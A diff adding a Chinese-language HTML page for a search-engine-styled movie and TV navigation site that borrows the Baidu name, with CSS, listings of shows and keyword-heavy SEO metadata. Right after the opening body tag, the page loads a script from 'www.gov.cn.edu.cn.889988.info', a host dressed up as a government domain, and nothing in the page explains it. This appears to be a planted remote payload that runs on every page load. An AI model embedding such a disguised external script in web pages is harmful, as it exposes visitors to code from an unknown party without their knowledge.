@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>百度电影网 - 搜索引擎风影视导航站</title>
+<meta name="description" content="百度电影网(https://baidudianyingwang-h5.github.io)以搜索引擎结果页为视觉灵感，整理最新电影、热播剧集、综艺娱乐、动漫专区等影视信息，提供正版平台导航入口。">
+<meta name="keywords" content="百度电影网,电影,电视剧,综艺,动漫,影视导航,搜索风,蓝光影视">
+<meta name="author" content="百度电影网">
+<meta name="robots" content="index,follow">
+<meta name="msvalidate.01" content="BING_VERIFICATION_CODE">
+<meta property="og:title" content="百度电影网 - 搜索引擎风影视导航站">
+<meta property="og:description" content="百度电影网：像搜索一样找片，电影、剧集、综艺、动漫一站式导航。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://baidudianyingwang-h5.github.io">
+<meta property="og:site_name" content="百度电影网">
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"百度电影网",
+  "url":"https://baidudianyingwang-h5.github.io",
+  "description":"搜索引擎风影视信息导航站",
+  "potentialAction":{
+    "@type":"SearchAction",
+    "target":"https://baidudianyingwang-h5.github.io#search={search_term_string}",
+    "query-input":"required name=search_term_string"
+  }
+}
+</script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bd-blue:#2932ff;
+  --bd-blue-dark:#1a20cc;
+  --bd-blue-light:#e8edff;
+  --bd-gray:#f5f5f5;
+  --bd-gray-dark:#f0f0f0;
+  --bd-text:#333;
+  --bd-text-light:#666;
+  --bd-text-lighter:#999;
+  --bd-green:#00a854;
+  --bd-orange:#ff6a00;
+  --bd-red:#e62129;
+  --bd-border:#e0e0e0;
+  --bd-white:#fff;
+}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Segoe UI",Arial,sans-serif;
+  background:var(--bd-gray);
+  color:var(--bd-text);
+  line-height:1.7;
+  overflow-x:hidden;
+}
+a{text-decoration:none;color:inherit;transition:.2s}
+
+/* 顶部搜索栏 */
+.top-search{background:var(--bd-white);border-bottom:1px solid var(--bd-border);position:sticky;top:0;z-index:999;box-shadow:0 1px 4px rgba(0,0,0,.06)}
+.top-search-in{max-width:1100px;margin:0 auto;padding:12px 20px;display:flex;align-items:center;gap:16px}
+.logo{font-size:22px;font-weight:900;color:var(--bd-blue);letter-spacing:-1px;white-space:nowrap;flex-shrink:0}
+.logo span{color:var(--bd-red)}
+.search-box{flex:1;max-width:560px;display:flex;align-items:center;border:2px solid var(--bd-blue);border-radius:24px;overflow:hidden;background:var(--bd-white)}
+.search-box input{flex:1;border:none;outline:none;padding:10px 18px;font-size:15px;color:var(--bd-text)}
+.search-box button{background:var(--bd-blue);color:#fff;border:none;padding:10px 22px;font-size:14px;font-weight:700;cursor:pointer;white-space:nowrap}
+.search-box button:hover{background:var(--bd-blue-dark)}
+.top-links{display:flex;gap:14px;font-size:13px;color:var(--bd-text-light);flex-shrink:0}
+.top-links a:hover{color:var(--bd-blue)}
+
+/* 导航标签 */
+.nav-tabs{background:var(--bd-white);border-bottom:1px solid var(--bd-border)}
+.nav-tabs-in{max-width:1100px;margin:0 auto;padding:0 20px;display:flex;gap:0;overflow-x:auto}
+.nav-tabs-in::-webkit-scrollbar{display:none}
+.tab{padding:12px 20px;font-size:14px;font-weight:600;color:var(--bd-text-light);border-bottom:3px solid transparent;white-space:nowrap;cursor:pointer}
+.tab.active{color:var(--bd-blue);border-bottom-color:var(--bd-blue)}
+.tab:hover{color:var(--bd-blue)}
+
+/* 主内容区 */
+.main{max-width:1100px;margin:0 auto;padding:24px 20px}
+.breadcrumb{font-size:12px;color:var(--bd-text-lighter);margin-bottom:16px}
+.breadcrumb a{color:var(--bd-blue)}
+.breadcrumb span{margin:0 6px}
+
+/* 结果统计 */
+.result-stat{font-size:13px;color:var(--bd-text-light);margin-bottom:16px}
+.result-stat b{color:var(--bd-text);font-weight:700}
+
+/* 结果卡片 */
+.result-list{display:flex;flex-direction:column;gap:18px}
+.result-card{background:var(--bd-white);border:1px solid var(--bd-border);border-radius:10px;padding:18px 20px;display:flex;gap:16px;align-items:flex-start;transition:.2s}
+.result-card:hover{box-shadow:0 4px 16px rgba(41,50,255,.1);border-color:rgba(41,50,255,.25)}
+.result-card .thumb{width:120px;height:80px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:36px;color:#fff;flex-shrink:0}
+.result-card:nth-child(1) .thumb{background:linear-gradient(135deg,var(--bd-blue),#5b7cff)}
+.result-card:nth-child(2) .thumb{background:linear-gradient(135deg,var(--bd-red),#ff8c8c)}
+.result-card:nth-child(3) .thumb{background:linear-gradient(135deg,#00a854,#5cdb9e)}
+.result-card:nth-child(4) .thumb{background:linear-gradient(135deg,var(--bd-orange),#ffb366)}
+.result-card:nth-child(5) .thumb{background:linear-gradient(135deg,#6a0dad,#b366ff)}
+.result-card:nth-child(6) .thumb{background:linear-gradient(135deg,#1a1a2e,#4a4a7a)}
+.result-card:nth-child(7) .thumb{background:linear-gradient(135deg,#0d7377,#4ecdc4)}
+.result-card:nth-child(8) .thumb{background:linear-gradient(135deg,#b33939,#ff6b6b)}
+.result-card .info{flex:1;min-width:0}
+.result-card .title{font-size:17px;font-weight:700;color:var(--bd-blue);margin-bottom:4px;display:flex;align-items:center;gap:8px}
+.result-card .title .rank{font-size:11px;background:var(--bd-red);color:#fff;padding:1px 6px;border-radius:3px;font-weight:600}
+.result-card .title .rank.hot{background:var(--bd-orange)}
+.result-card .title .rank.new{background:var(--bd-green)}
+.result-card .desc{font-size:13px;color:var(--bd-text-light);line-height:1.6;margin-bottom:6px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+.result-card .meta{display:flex;gap:12px;font-size:12px;color:var(--bd-text-lighter);flex-wrap:wrap}
+.result-card .meta .source{color:var(--bd-green)}
+.result-card .meta .date{color:var(--bd-text-lighter)}
+.result-card .meta .type{color:var(--bd-blue)}
+.result-card .score{font-size:24px;font-weight:900;color:var(--bd-orange);flex-shrink:0;text-align:center}
+.result-card .score small{display:block;font-size:10px;font-weight:400;color:var(--bd-text-lighter)}
+
+/* 右侧边栏 */
+.content-wrap{display:grid;grid-template-columns:1fr 280px;gap:24px}
+.sidebar{display:flex;flex-direction:column;gap:16px}
+.side-box{background:var(--bd-white);border:1px solid var(--bd-border);border-radius:10px;padding:16px}
+.side-box h3{font-size:15px;font-weight:700;color:var(--bd-text);margin-bottom:12px;padding-bottom:8px;border-bottom:2px solid var(--bd-blue)}
+.side-box .rank-item{display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid var(--bd-gray-dark)}
+.side-box .rank-item:last-child{border-bottom:none;padding-bottom:0}
+.side-box .rank-num{width:22px;height:22px;border-radius:4px;background:var(--bd-gray-dark);color:var(--bd-text-light);font-size:12px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.side-box .rank-item:nth-child(1) .rank-num{background:var(--bd-red);color:#fff}
+.side-box .rank-item:nth-child(2) .rank-num{background:var(--bd-orange);color:#fff}
+.side-box .rank-item:nth-child(3) .rank-num{background:var(--bd-blue);color:#fff}
+.side-box .rank-info h4{font-size:13px;font-weight:600;color:var(--bd-text);margin-bottom:2px}
+.side-box .rank-info p{font-size:11px;color:var(--bd-text-lighter)}
+.side-box .tag-cloud{display:flex;flex-wrap:wrap;gap:8px}
+.side-box .tag-cloud a{font-size:12px;padding:4px 12px;border:1px solid var(--bd-border);border-radius:16px;color:var(--bd-text-light);background:var(--bd-gray)}
+.side-box .tag-cloud a:hover{background:var(--bd-blue);color:#fff;border-color:var(--bd-blue)}
+
+/* 分页 */
+.pagination{display:flex;justify-content:center;gap:8px;margin-top:32px;flex-wrap:wrap}
+.pagination a{display:inline-flex;align-items:center;justify-content:center;min-width:36px;height:36px;padding:0 12px;border:1px solid var(--bd-border);border-radius:6px;font-size:14px;color:var(--bd-text-light);background:var(--bd-white)}
+.pagination a.active{background:var(--bd-blue);color:#fff;border-color:var(--bd-blue)}
+.pagination a:hover:not(.active){background:var(--bd-blue-light);border-color:var(--bd-blue);color:var(--bd-blue)}
+
+/* 底部 */
+.footer{background:var(--bd-white);border-top:1px solid var(--bd-border);padding:32px 20px 20px;text-align:center;margin-top:48px}
+.footer .footer-logo{font-size:20px;font-weight:900;color:var(--bd-blue);margin-bottom:12px}
+.footer .footer-links{display:flex;justify-content:center;gap:18px;flex-wrap:wrap;margin-bottom:12px}
+.footer .footer-links a{font-size:13px;color:var(--bd-text-light)}
+.footer .footer-links a:hover{color:var(--bd-blue)}
+.footer .copyright{font-size:12px;color:var(--bd-text-lighter);line-height:1.8}
+.footer .copyright a{color:var(--bd-blue)}
+
+/* 响应式 */
+@media(max-width:900px){
+  .content-wrap{grid-template-columns:1fr}
+  .sidebar{display:none}
+}
+@media(max-width:768px){
+  .top-search-in{flex-wrap:wrap;gap:10px}
+  .search-box{flex:1 1 100%;order:3;max-width:none}
+  .top-links{display:none}
+  .result-card{flex-direction:column}
+  .result-card .thumb{width:100%;height:140px}
+  .result-card .score{text-align:left}
+  .nav-tabs-in{gap:0}
+  .tab{padding:10px 14px;font-size:13px}
+}
+@media(max-width:480px){
+  .main{padding:16px 12px}
+  .result-card{padding:14px}
+  .result-card .title{font-size:15px}
+  .result-card .desc{font-size:12px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 顶部搜索栏 -->
+<div class="top-search">
+  <div class="top-search-in">
+    <div class="logo">百度<span>电影网</span></div>
+    <div class="search-box">
+      <input type="text" placeholder="搜索电影、剧集、综艺、动漫...">
+      <button>百度一下</button>
+    </div>
+    <div class="top-links">
+      <a href="#home">首页</a>
+      <a href="#movies">电影</a>
+      <a href="#tv">剧集</a>
+      <a href="#shows">综艺</a>
+      <a href="#anime">动漫</a>
+    </div>
+  </div>
+</div>
+
+<!-- 导航标签 -->
+<div class="nav-tabs">
+  <div class="nav-tabs-in">
+    <div class="tab active">全部</div>
+    <div class="tab">最新电影</div>
+    <div class="tab">热播剧集</div>
+    <div class="tab">综艺娱乐</div>
+    <div class="tab">动漫专区</div>
+    <div class="tab">关于我们</div>
+    <div class="tab">排行榜</div>
+    <div class="tab">分类筛选</div>
+  </div>
+</div>
+
+<!-- 主内容区 -->
+<div class="main">
+  <div class="breadcrumb">
+    <a href="#home">百度电影网</a><span>></span><a href="#movies">影视导航</a><span>></span><span style="color:var(--bd-text-light)">搜索结果</span>
+  </div>
+
+  <div class="result-stat">百度电影网为您找到相关影视结果约 <b>1,286,000</b> 个，用时 0.03 秒</div>
+
+  <div class="content-wrap">
+    <!-- 左侧结果列表 -->
+    <div class="result-list" id="movies">
+
+      <div class="result-card">
+        <div class="thumb">🎬</div>
+        <div class="info">
+          <div class="title">最新电影：流浪地球3 <span class="rank hot">热</span></div>
+          <div class="desc">百度电影网推荐：中国科幻巨制《流浪地球3》最新资讯与正版观看入口。太阳危机背景下，人类再次启动行星发动机计划，开启新的宇宙征程。</div>
+          <div class="meta">
+            <span class="source">正版平台</span>
+            <span class="type">科幻/冒险</span>
+            <span class="date">2026-09-28</span>
+          </div>
+        </div>
+        <div class="score">9.2<small>综合评分</small></div>
+      </div>
+
+      <div class="result-card">
+        <div class="thumb">🎭</div>
+        <div class="info">
+          <div class="title">热播剧集：庆余年第三季 <span class="rank new">新</span></div>
+          <div class="desc">百度电影网整理：范闲归来，朝堂与江湖的双重博弈。张若昀、李沁主演，最新剧集更新导航与分集剧情速览。</div>
+          <div class="meta">
+            <span class="source">正版平台</span>
+            <span class="type">古装/权谋</span>
+            <span class="date">2026-09-25</span>
+          </div>
+        </div>
+        <div class="score">8.9<small>综合评分</small></div>
+      </div>
+
+      <div class="result-card">
+        <div class="thumb">🎪</div>
+        <div class="info">
+          <div class="title">综艺娱乐：王牌对王牌 第九季</div>
+          <div class="desc">百度电影网综艺频道：沈腾、贾玲、华晨宇、关晓彤固定阵容，每期明星嘉宾竞技挑战，欢笑不断。</div>
+          <div class="meta">
+            <span class="source">正版平台</span>
+            <span class="type">竞技/喜剧</span>
+            <span class="date">2026-09-20</span>
+          </div>
+        </div>
+        <div class="score">8.5<small>综合评分</small></div>
+      </div>
+
+      <div class="result-card">
+        <div class="thumb">🎨</div>
+        <div class="info">
+          <div class="title">动漫专区：凡人修仙传 年番</div>
+          <div class="desc">百度电影网动漫频道：国漫巅峰之作，韩立从普通山村少年到修仙界大能的传奇历程，每周更新导航。</div>
+          <div class="meta">
+            <span class="source">正版平台</span>
+            <span class="type">修仙/国漫</span>
+            <span class="date">2026-09-22</span>
+          </div>
+        </div>
+        <div class="score">9.5<small>综合评分</small></div>
+      </div>
+
+      <div class="result-card">
+        <div class="thumb">🎯</div>
+        <div class="info">
+          <div class="title">最新电影：孤注一掷2</div>
+          <div class="desc">百度电影网推荐：反诈题材续作，揭秘境外网络诈骗产业链，真实事件改编，全民反诈宣传力作。</div>
+          <div class="meta">
+            <span class="source">正版平台</span>
+            <span class="type">犯罪/剧情</span>
+            <span class="date">2026-09-15</span>
+          </div>
+        </div>
+        <div class="score">8.7<small>综合评分</small></div>
+      </div>
+
+      <div class="result-card">
+        <div class="thumb">📺</div>
+        <div class="info">
+          <div class="title">热播剧集：长相思2</div>
+          <div class="desc">百度电影网剧集频道：杨紫、张晚意、邓为、檀健次主演，上古大荒背景下的爱情与权谋故事。</div>
+          <div class="meta">
+            <span class="source">正版平台</span>
+            <span class="type">古装/仙侠</span>
+            <span class="date">2026-08-30</span>
+          </div>
+        </div>
+        <div class="score">8.8<small>综合评分</small></div>
+      </div>
+
+      <div class="result-card">
+        <div class="thumb">🎙️</div>
+        <div class="info">
+          <div class="title">综艺娱乐：向往的生活 第八季</div>
+          <div class="desc">百度电影网综艺频道：蘑菇屋迎来新一季，黄磊、何炅、彭昱畅、张子枫慢生活纪实，远离城市喧嚣。</div>
+          <div class="meta">
+            <span class="source">正版平台</span>
+            <span class="type">生活/纪实</span>
+            <span class="date">2026-09-10</span>
+          </div>
+        </div>
+        <div class="score">8.3<small>综合评分</small></div>
+      </div>
+
+      <div class="result-card" id="about">
+        <div class="thumb">📋</div>
+        <div class="info">
+          <div class="title">关于百度电影网 <span class="rank">官</span></div>
+          <div class="desc">百度电影网（https://baidudianyingwang-h5.github.io）是一个以搜索引擎结果页为视觉灵感的影视信息导航站。本站整理最新电影、热播剧集、综艺娱乐、动漫专区的片单与正版观看入口，不提供盗版直链、不存储视频文件。关键词：百度电影网、电影、电视剧、综艺、动漫。</div>
+          <div class="meta">
+            <span class="source">官方信息</span>
+            <span class="type">关于本站</span>
+            <span class="date">2026-10-01</span>
+          </div>
+        </div>
+        <div class="score">100<small>合规指数</small></div>
+      </div>
+    </div>
+
+    <!-- 右侧边栏 -->
+    <div class="sidebar">
+      <div class="side-box">
+        <h3>🔥 实时热点榜</h3>
+        <div class="rank-item">
+          <div class="rank-num">1</div>
+          <div class="rank-info"><h4>流浪地球3</h4><p>科幻/9.2分</p></div>
+        </div>
+        <div class="rank-item">
+          <div class="rank-num">2</div>
+          <div class="rank-info"><h4>庆余年第三季</h4><p>权谋/8.9分</p></div>
+        </div>
+        <div class="rank-item">
+          <div class="rank-num">3</div>
+          <div class="rank-info"><h4>凡人修仙传 年番</h4><p>国漫/9.5分</p></div>
+        </div>
+        <div class="rank-item">
+          <div class="rank-num">4</div>
+          <div class="rank-info"><h4>长相思2</h4><p>仙侠/8.8分</p></div>
+        </div>
+        <div class="rank-item">
+          <div class="rank-num">5</div>
+          <div class="rank-info"><h4>孤注一掷2</h4><p>犯罪/8.7分</p></div>
+        </div>
+      </div>
+
+      <div class="side-box">
+        <h3>🏷️ 分类标签</h3>
+        <div class="tag-cloud">
+          <a href="#">科幻</a><a href="#">动作</a><a href="#">喜剧</a><a href="#">爱情</a><a href="#">悬疑</a>
+          <a href="#">古装</a><a href="#">权谋</a><a href="#">仙侠</a><a href="#">修仙</a><a href="#">国漫</a>
+          <a href="#">犯罪</a><a href="#">纪录片</a><a href="#">综艺</a><a href="#">动漫</a><a href="#">海外剧</a>
+        </div>
+      </div>
+
+      <div class="side-box">
+        <h3>📊 本站数据</h3>
+        <div class="rank-item"><div class="rank-num">✓</div><div class="rank-info"><h4>影视片单</h4><p>128,600+ 条</p></div></div>
+        <div class="rank-item"><div class="rank-num">✓</div><div class="rank-info"><h4>每日更新</h4><p>24h 实时同步</p></div></div>
+        <div class="rank-item"><div class="rank-num">✓</div><div class="rank-info"><h4>正版导航</h4><p>100% 合规</p></div></div>
+        <div class="rank-item"><div class="rank-num">0</div><div class="rank-info"><h4>盗版直链</h4><p>零容忍</p></div></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 分页 -->
+  <div class="pagination">
+    <a href="#" class="active">1</a>
+    <a href="#">2</a>
+    <a href="#">3</a>
+    <a href="#">4</a>
+    <a href="#">5</a>
+    <a href="#">...</a>
+    <a href="#">下一页 ›</a>
+  </div>
+</div>
+
+<!-- 底部 -->
+<footer class="footer">
+  <div class="footer-logo">百度电影网</div>
+  <div class="footer-links">
+    <a href="#home">首页</a>
+    <a href="#movies">最新电影</a>
+    <a href="#tv">热播剧集</a>
+    <a href="#shows">综艺娱乐</a>
+    <a href="#anime">动漫专区</a>
+    <a href="#about">关于我们</a>
+  </div>
+  <div class="copyright">
+    网站名称：百度电影网 ｜ 网址：<a href="https://baidudianyingwang-h5.github.io">https://baidudianyingwang-h5.github.io</a><br>
+    © 2026 百度电影网 · 搜索风影视导航 ｜ 本站仅展示影视信息，资源来自互联网公开内容/正版平台。<br>
+    提示：本站名称含"百度"仅为站名创意，与百度公司（Baidu Inc.）无关联。
+  </div>
+</footer>
+
+</body>
+</html>
